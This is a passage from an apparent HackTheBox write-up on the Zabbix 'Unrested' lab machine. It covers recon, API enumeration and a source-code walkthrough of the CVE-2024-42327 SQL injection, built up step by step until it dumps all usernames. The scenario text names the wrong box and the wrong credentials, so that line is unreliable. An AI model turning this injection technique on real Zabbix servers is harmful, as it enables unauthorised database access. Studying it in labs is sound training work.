@@ -1,0 +1,717 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Unrested</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-unrested">htb-unrested</a> <a class="post-tag" href="/tags#assume-breach">assume-breach</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#zabbix">zabbix</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#cve-2024-42327">cve-2024-42327</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#cve-2024-36467">cve-2024-36467</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-03-04T10:00:00+00:00" itemprop="datePublished">Mar 4, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/03/04/htb-unrested.html" style="color: #e6e6e6; text-decoration: none;">HTB: Unrested</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/unrested-cover.webp" type="image/webp"/>
+<img alt="Unrested" class="include_image" loading="lazy" src="/img/unrested-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Unrested is all about a Zabbix server and a critical vulnerability that was made public in December 2024. It’s a SQL injection vulnerability, and I’ll deep dive into the source to see how it works, and how to exploit it. Most solutions to this box show blind SQL injection, I’ll show how to use the source code to figure out how to get data back from the DB. For root, I’ll abuse sudo nmap with a custom wrapper that breaks the published GTFObins. In Beyond Root, I’ll look at another vulnerability that came out at the same time, and show what the super admin role looks like in the GUI by escalating my user to that role.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/639 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/unrested" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Unrested</a> <a href="https://hackthebox.com/machines/unrested" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-unrested.webp" type="image/webp"/> <img alt="Unrested" class="img-av" src="/icons/box-unrested.png"/></picture></a><br/><a href="https://hackthebox.com/machines/unrested" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1865410968584352071">05 Dec 2024</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">05 Dec 2024</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/114053" rel="noopener" target="_blank"><img alt="TheCyberGeek" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/114053" style="display: unset"/><span class="user-text" style="display: none"> TheCyberGeek</span></a><br/></td>
+</tr>
+<tr>
+<td>Scenario</td>
+<td style="text-align: right"><span class="htb-scenario"> As is common in Windows pentests, you will start the Certified box with credentials for the following account:<br/>Username: judith.mader Password: judith09 </span></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds four open TCP ports, SSH (22), HTTP (80), and two unknown ports (10050, 10051):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.50
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 14:16 UTC
+Nmap scan report for 10.10.11.50
+Host is up (0.087s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10050/tcp open  zabbix-agent
+10051/tcp open  zabbix-trapper
+
+Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,10050,10051 <span class="nt">-sCV</span> 10.10.11.50
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 14:17 UTC
+Nmap scan report for 10.10.11.50
+Host is up (0.085s latency).
+
+PORT      STATE SERVICE             VERSION
+22/tcp    open  ssh                 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp    open  http                Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+10050/tcp open  tcpwrapped
+10051/tcp open  ssl/zabbix-trapper?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 22.04 jammy.</p>
+<h3 id="initial-credentials">Initial Credentials</h3>
+<p>This box is meant to simulate a web application pentest, where it is common to have an account on the application to completely test it. The site says:</p>
+<p><span class="htb-scenario"> As is common in Windows pentests, you will start the Certified box with credentials for the following account:<br/>Username: judith.mader Password: judith09 </span></p>
+<h3 id="zabbix---tcp-80">Zabbix - TCP 80</h3>
+<h4 id="unauthenticated-site">Unauthenticated Site</h4>
+<p>The website on TCP 80 is an instance of Zabbix:</p>
+<picture>
+<source srcset="/img/image-20250228092616361.webp" type="image/webp"/>
+<img alt="image-20250228092616361" class="include_image" loading="lazy" src="/img/image-20250228092616361.png"/>
+</picture>
+<p><a href="https://www.zabbix.com/">Zabbix</a> is an open-source enterprise monitoring software.</p>
+<p><a href="https://www.zabbix.com/forum/zabbix-help/47241-zabbix-agent-and-server-ports">This post</a> on the Zabbix forums suggests that ports 10050 and 10051 have to do with Zabbix as well. I’m not able to get anything else out of these with <code class="language-plaintext highlighter-rouge">curl</code> or <code class="language-plaintext highlighter-rouge">nc</code>.</p>
+<p>Not much else I can do here without creds.</p>
+<h4 id="authenticated-site">Authenticated Site</h4>
+<p>On giving the provided creds, I’m able to log into the site and get a dashboard:</p>
+<picture>
+<source srcset="/img/image-20250228094137278.webp" type="image/webp"/>
+<img alt="image-20250228094137278" class="include_image" loading="lazy" src="/img/image-20250228094137278.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p><a href="https://github.com/zabbix/zabbix">Zabbix source</a> shows it’s written in PHP, and loading <code class="language-plaintext highlighter-rouge">/zabbix/</code> as <code class="language-plaintext highlighter-rouge">/zabbix/index.php</code> works. The dashboard also natively loads as <code class="language-plaintext highlighter-rouge">/zabbix/zabbix.php</code> after logging in.</p>
+<p>The initial HTTP response sets a <code class="language-plaintext highlighter-rouge">zbx_session</code> cookie:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 28 Feb 2025 14:27:35 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.52 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">zbx_session=eyJzZXNzaW9uaWQiOiIwYTAyYzlmMzFmMzNmNTY3Y2Q5NDkxMTY5OWE5NzA4YyIsInNpZ24iOiI3NTQxNzhkMWQ5Y2ExZjIyNWU0MDVhNGMzZDhhMjQ3M2Q5OWYzODgzMzVlMjIxYmJhYTE4NmMwMTUxNjdjNzg2In0%3D; path=/zabbix; HttpOnly</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3909</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+</code></pre></div></div>
+<p>The cookie looks like base64, and it is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"eyJzZXNzaW9uaWQiOiIwYTAyYzlmMzFmMzNmNTY3Y2Q5NDkxMTY5OWE5NzA4YyIsInNpZ24iOiI3NTQxNzhkMWQ5Y2ExZjIyNWU0MDVhNGMzZDhhMjQ3M2Q5OWYzODgzMzVlMjIxYmJhYTE4NmMwMTUxNjdjNzg2In0="</span> | <span class="nb">base64</span> <span class="nt">-d</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "sessionid": "0a02c9f31f33f567cd94911699a9708c",
+  "sign": "754178d1d9ca1f225e405a4c3d8a2473d99f388335e221bbaa186c015167c786"
+}
+</span></code></pre></div></div>
+<p>In the dashboard and at the footer of the authenticated site, it shows the version as 7.0.0:</p>
+<picture>
+<source srcset="/img/image-20250228134929550.webp" type="image/webp"/>
+<img alt="image-20250228134929550" class="include_image" loading="lazy" src="/img/image-20250228134929550.png"/>
+</picture>
+<p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250228093414340.webp" type="image/webp"/>
+<img alt="image-20250228093414340" class="include_image" loading="lazy" src="/img/image-20250228093414340.png"/>
+</picture>
+<p>I’ll skip the directory brute force given that the source is public.</p>
+<h3 id="api-enumeration">API Enumeration</h3>
+<h4 id="general-interaction">General Interaction</h4>
+<p>I’m going to need some basic understanding of how to work with the Zabbix API, which is documented <a href="https://www.zabbix.com/documentation/current/en/manual/api">in the Zabbix docs</a>.</p>
+<p>Without any auth, I can request the version:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.10.11.50/zabbix/api_jsonrpc.php <span class="nt">-H</span> <span class="s1">'Content-Type: application/json-rpc'</span> <span class="nt">-d</span> <span class="s1">'{"jsonrpc": "2.0", "method": "apiinfo.version", "params": {}, "id": 1}'</span>
+<span class="go">{"jsonrpc":"2.0","result":"7.0.0","id":1}
+</span></code></pre></div></div>
+<h4 id="auth">Auth</h4>
+<p>I’ll use the given creds to get a token:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.10.11.50/zabbix/api_jsonrpc.php <span class="nt">-H</span> <span class="s1">'Content-Type: application/json-rpc'</span> <span class="nt">-d</span> <span class="s1">'{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "matthew", "password": "96qzn0h2e1k3"}, "id": 1}'</span>
+<span class="go">{"jsonrpc":"2.0","result":"d2a3d7abe1800ee24ab7d729df6c5439","id":1}
+</span></code></pre></div></div>
+<p>I can use a <code class="language-plaintext highlighter-rouge">bash</code> one-liner to get a token and save it in an environment variable to easier use:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">token</span><span class="o">=</span><span class="si">$(</span>curl http://10.10.11.50/zabbix/api_jsonrpc.php <span class="nt">-H</span> <span class="s1">'Content-Type: application/json-rpc'</span> <span class="nt">-d</span> <span class="s1">'{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "matthew", "password": "96qzn0h2e1k3"}, "id": 1}'</span> <span class="nt">-s</span> | jq <span class="nt">-r</span> .result<span class="si">)</span>
+<span class="gp">(venv) oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$token</span><span class="s2">"</span>
+<span class="go">b8d0a591918636dd028247ebc141cbd8
+</span></code></pre></div></div>
+<p>I could also go to Burp and get requests going in Repeater. There’s a <code class="language-plaintext highlighter-rouge">user.checkAuthentication</code> API that will show details about a given sessionid:</p>
+<picture>
+<source srcset="/img/image-20250228142158649.webp" type="image/webp"/>
+<img alt="image-20250228142158649" class="include_image" loading="lazy" src="/img/image-20250228142158649.png"/>
+</picture>
+<p>Most API endpoints take the token in an authorization header. For example, this endpoint returns unauthorized:</p>
+<picture>
+<source srcset="/img/image-20250228142441462.webp" type="image/webp"/>
+<img alt="image-20250228142441462" class="include_image" loading="lazy" src="/img/image-20250228142441462.png"/>
+</picture>
+<p>When I add in the token in an <code class="language-plaintext highlighter-rouge">Authorization</code> header, it does:</p>
+<picture>
+<source srcset="/img/image-20250228142536613.webp" type="image/webp"/>
+<img alt="image-20250228142536613" class="include_image" loading="lazy" src="/img/image-20250228142536613.png"/>
+</picture>
+<h4 id="users">Users</h4>
+<p>In theory, I should be able to use the <a href="https://www.zabbix.com/documentation/current/en/manual/api/reference/user/get">user.get</a> endpoint to get a list of all users. The site says:</p>
+<blockquote>
+<p>Note: This method is available to users of any type. Permissions to call the method can be revoked in user role settings. See <a href="https://www.zabbix.com/documentation/current/en/manual/web_interface/frontend_sections/users/user_roles">User roles</a> for more information.</p>
+</blockquote>
+<p>If I try though, it returns nothing:</p>
+<picture>
+<source srcset="/img/image-20250228144812880.webp" type="image/webp"/>
+<img alt="image-20250228144812880" class="include_image" loading="lazy" src="/img/image-20250228144812880.png"/>
+</picture>
+<p>If I add in the <code class="language-plaintext highlighter-rouge">editable</code> field, it does return information about my user (I’ll show why shortly):</p>
+<picture>
+<source srcset="/img/image-20250228144838411.webp" type="image/webp"/>
+<img alt="image-20250228144838411" class="include_image" loading="lazy" src="/img/image-20250228144838411.png"/>
+</picture>
+<p>I’ll note matthew has a <code class="language-plaintext highlighter-rouge">userid</code> of 3.</p>
+<p>I can also request groups the same way, but don’t get any:</p>
+<picture>
+<source srcset="/img/image-20250228151617589.webp" type="image/webp"/>
+<img alt="image-20250228151617589" class="include_image" loading="lazy" src="/img/image-20250228151617589.png"/>
+</picture>
+<p>Again, likely this server is set up to require admins for this request.</p>
+<h2 id="shell-as-zabbix">Shell as zabbix</h2>
+<h3 id="identify-cves">Identify CVEs</h3>
+<p>Searching for CVEs in Zabbix 7.0.0, I’ll come across two solid options:</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36467">CVE-2024-36467</a> - An authenticated user with API access (e.g.: user with default User role), more specifically a user with access to the user.update API endpoint is enough to be able to add themselves to any group (e.g.: Zabbix Administrators), except to groups that are disabled or having restricted GUI access.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42327">CVE-2024-42327</a> - A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.</li>
+</ul>
+<p>It turns out that being in the Zabbix Administrators group doesn’t buy that much in this configuration. I’ll look at CVE-2024-36467 in <a href="#cve-2024-36467">Beyond Root</a>.</p>
+<p>I’ll focus on CVE-2024-42327 now.</p>
+<h3 id="cve-2024-42327">CVE-2024-42327</h3>
+<h4 id="background">Background</h4>
+<p>The Nist description says that the injection is in the <code class="language-plaintext highlighter-rouge">CUser</code> class in the <code class="language-plaintext highlighter-rouge">addRelatedObjects</code> function which is accessed via the <code class="language-plaintext highlighter-rouge">get</code> function. <code class="language-plaintext highlighter-rouge">get</code> is in <code class="language-plaintext highlighter-rouge">CUser.php</code> on <a href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L68-L243">lines 68-243</a>. <code class="language-plaintext highlighter-rouge">addRelatedObjects</code> is called on <a href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L233-L235">line 234</a>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">addRelatedObjects</span><span class="p">(</span><span class="nv">$options</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This function is responsible for getting other information associated with a user that isn’t stored with the user table in the database, such as groups, media, and roles. In the section about roles at the end of the function, there is this code:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// adding user role</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">]</span> <span class="o">!==</span> <span class="no">API_OUTPUT_COUNT</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">]</span> <span class="o">===</span> <span class="no">API_OUTPUT_EXTEND</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'roleid'</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">,</span> <span class="s1">'type'</span><span class="p">,</span> <span class="s1">'readonly'</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="nv">$db_roles</span> <span class="o">=</span> <span class="nf">DBselect</span><span class="p">(</span>
+        <span class="s1">'SELECT u.userid'</span><span class="mf">.</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">]</span> <span class="o">?</span> <span class="s1">',r.'</span><span class="mf">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">',r.'</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">)</span><span class="mf">.</span>
+        <span class="s1">' FROM users u,role r'</span><span class="mf">.</span>
+        <span class="s1">' WHERE u.roleid=r.roleid'</span><span class="mf">.</span>
+        <span class="s1">' AND '</span><span class="mf">.</span><span class="nf">dbConditionInt</span><span class="p">(</span><span class="s1">'u.userid'</span><span class="p">,</span> <span class="nv">$userIds</span><span class="p">)</span>
+    <span class="p">);</span>
+
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$userid</span> <span class="o">=&gt;</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$result</span><span class="p">[</span><span class="nv">$userid</span><span class="p">][</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="p">}</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="nv">$db_role</span> <span class="o">=</span> <span class="nf">DBfetch</span><span class="p">(</span><span class="nv">$db_roles</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$userid</span> <span class="o">=</span> <span class="nv">$db_role</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">];</span>
+        <span class="k">unset</span><span class="p">(</span><span class="nv">$db_role</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]);</span>
+
+        <span class="nv">$result</span><span class="p">[</span><span class="nv">$userid</span><span class="p">][</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$db_role</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Specifically on <a href="https://github.com/zabbix/zabbix/blob/49955f1fb5c9168a8a24b053f7ade6b3d903143c/ui/include/classes/api/services/CUser.php#L3046C1-L3051C6">lines 3046-3051</a> there’s a call to <code class="language-plaintext highlighter-rouge">DBselect</code> using a query build from unsanitized user input.</p>
+<h4 id="crashing-sqli">Crashing SQLI</h4>
+<p>If I try to send just a <code class="language-plaintext highlighter-rouge">'</code> to crash it as a regular user, it won’t work:</p>
+<picture>
+<source srcset="/img/image-20250228183600574.webp" type="image/webp"/>
+<img alt="image-20250228183600574" class="include_image" loading="lazy" src="/img/image-20250228183600574.png"/>
+</picture>
+<p>That’s because of this permissions check on <a href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L107-L121">lines 107-121</a> in <code class="language-plaintext highlighter-rouge">get</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// permission check</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nv">$userData</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]</span> <span class="o">!=</span> <span class="no">USER_TYPE_SUPER_ADMIN</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'editable'</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nv">$sqlParts</span><span class="p">[</span><span class="s1">'from'</span><span class="p">][</span><span class="s1">'users_groups'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'users_groups ug'</span><span class="p">;</span>
+        <span class="nv">$sqlParts</span><span class="p">[</span><span class="s1">'where'</span><span class="p">][</span><span class="s1">'uug'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'u.userid=ug.userid'</span><span class="p">;</span>
+        <span class="nv">$sqlParts</span><span class="p">[</span><span class="s1">'where'</span><span class="p">][]</span> <span class="o">=</span> <span class="s1">'ug.usrgrpid IN ('</span><span class="mf">.</span>
+            <span class="s1">' SELECT uug.usrgrpid'</span><span class="mf">.</span>
+            <span class="s1">' FROM users_groups uug'</span><span class="mf">.</span>
+            <span class="s1">' WHERE uug.userid='</span><span class="mf">.</span><span class="k">self</span><span class="o">::</span><span class="nv">$userData</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span><span class="mf">.</span>
+        <span class="s1">')'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$sqlParts</span><span class="p">[</span><span class="s1">'where'</span><span class="p">][]</span> <span class="o">=</span> <span class="s1">'u.userid='</span><span class="mf">.</span><span class="k">self</span><span class="o">::</span><span class="nv">$userData</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>I have to either provide the <code class="language-plaintext highlighter-rouge">editable</code> option, or my user has to have the correct permissions. Adding <code class="language-plaintext highlighter-rouge">editable</code> works:</p>
+<picture>
+<source srcset="/img/image-20250228184346642.webp" type="image/webp"/>
+<img alt="image-20250228184346642" class="include_image" loading="lazy" src="/img/image-20250228184346642.png"/>
+</picture>
+<p>That’s a good sign that I’ve started SQL injection.</p>
+<p>Interestingly, if I use CVE-2024-36467 to add the matthew user to the Zabbix Administrators group, <code class="language-plaintext highlighter-rouge">editable</code> is not needed.</p>
+<h4 id="sqli-poc">SQLI POC</h4>
+<p>The code generating the query is:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$db_roles</span> <span class="o">=</span> <span class="nf">DBselect</span><span class="p">(</span>
+    <span class="s1">'SELECT u.userid'</span><span class="mf">.</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">]</span> <span class="o">?</span> <span class="s1">',r.'</span><span class="mf">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">',r.'</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'selectRole'</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">)</span><span class="mf">.</span>
+    <span class="s1">' FROM users u,role r'</span><span class="mf">.</span>
+    <span class="s1">' WHERE u.roleid=r.roleid'</span><span class="mf">.</span>
+    <span class="s1">' AND '</span><span class="mf">.</span><span class="nf">dbConditionInt</span><span class="p">(</span><span class="s1">'u.userid'</span><span class="p">,</span> <span class="nv">$userIds</span><span class="p">)</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<p>It’s taking the <code class="language-plaintext highlighter-rouge">selectRole</code> option and joining all of them with <code class="language-plaintext highlighter-rouge">,r.</code>. So if I passed in <code class="language-plaintext highlighter-rouge">["role1", "role2"]</code>, it would generate:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">u</span><span class="p">.</span><span class="n">userid</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">role1</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">role2</span> <span class="k">FROM</span> <span class="n">users</span> <span class="n">u</span><span class="p">,</span> <span class="k">role</span> <span class="n">r</span> <span class="k">WHERE</span> <span class="n">u</span><span class="p">.</span><span class="n">roleid</span><span class="o">=</span><span class="k">role</span><span class="p">.</span><span class="n">roleid</span> <span class="k">AND</span> <span class="n">u</span><span class="p">.</span><span class="n">userid</span> <span class="k">in</span> <span class="p">[</span><span class="err">$</span><span class="n">userIds</span><span class="p">];</span>
+</code></pre></div></div>
+<p>There’s almost certainly a blind attack here, but if I want to get data back, I need to include the <code class="language-plaintext highlighter-rouge">FROM users u, role r WHERE u.roleid=r.roleid r;-- -</code> in my query.</p>
+<p>To build this up, I’ll start with a simple query to get the role name (and use <code class="language-plaintext highlighter-rouge">"output": []</code> to just show that, getting rid of the user data noise):</p>
+<picture>
+<source srcset="/img/image-20250228190122507.webp" type="image/webp"/>
+<img alt="image-20250228190122507" class="include_image" loading="lazy" src="/img/image-20250228190122507.png"/>
+</picture>
+<p>It is showing the user role, because that’s the role associated with my user id. I should be able to inject to have it show all roles:</p>
+<picture>
+<source srcset="/img/image-20250228190317772.webp" type="image/webp"/>
+<img alt="image-20250228190317772" class="include_image" loading="lazy" src="/img/image-20250228190317772.png"/>
+</picture>
+<p>This effectively makes the query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">u</span><span class="p">.</span><span class="n">userid</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">name</span> <span class="k">from</span> <span class="n">users</span> <span class="n">u</span><span class="p">,</span> <span class="k">role</span> <span class="n">r</span> <span class="k">WHERE</span> <span class="n">u</span><span class="p">.</span><span class="n">roleid</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">roleid</span><span class="p">;</span> <span class="c1">-- - FROM users u, role r WHERE u.roleid=role.roleid AND u.userid in [$userIds];</span>
+</code></pre></div></div>
+<p>Instead of filtering based on my id, it returns all ids.</p>
+<h4 id="sqli-read-poc">SQLI Read POC</h4>
+<p>Getting the full list of roles is not super useful. I want to read other tables. To do that, I’ll start by adding another thing to read besides name. If I include a 1 as well, it will print that for each value:</p>
+<picture>
+<source srcset="/img/image-20250228191205566.webp" type="image/webp"/>
+<img alt="image-20250228191205566" class="include_image" loading="lazy" src="/img/image-20250228191205566.png"/>
+</picture>
+<p>I can change that into a subquery:</p>
+<picture>
+<source srcset="/img/image-20250228191101094.webp" type="image/webp"/>
+<img alt="image-20250228191101094" class="include_image" loading="lazy" src="/img/image-20250228191101094.png"/>
+</picture>
+<p>The sub-query must return a single value, but I can use <code class="language-plaintext highlighter-rouge">group_concat</code> to achieve that, and try to read something:</p>
+<picture>
+<source srcset="/img/image-20250228191015573.webp" type="image/webp"/>
+<img alt="image-20250228191015573" class="include_image" loading="lazy" src="/img/image-20250228191015573.png"/>
+</picture>
+<p>That’s all three users - Admin, guest, and matthew!</p>
